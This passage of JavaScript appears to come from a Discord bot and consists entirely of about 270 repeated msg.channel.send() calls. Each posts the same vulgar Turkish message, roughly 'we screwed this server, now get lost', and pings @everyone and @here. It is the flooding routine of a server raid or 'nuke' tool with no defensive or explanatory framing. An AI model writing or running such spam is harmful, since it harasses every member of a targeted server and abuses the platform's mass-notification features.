    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
     msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
     msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
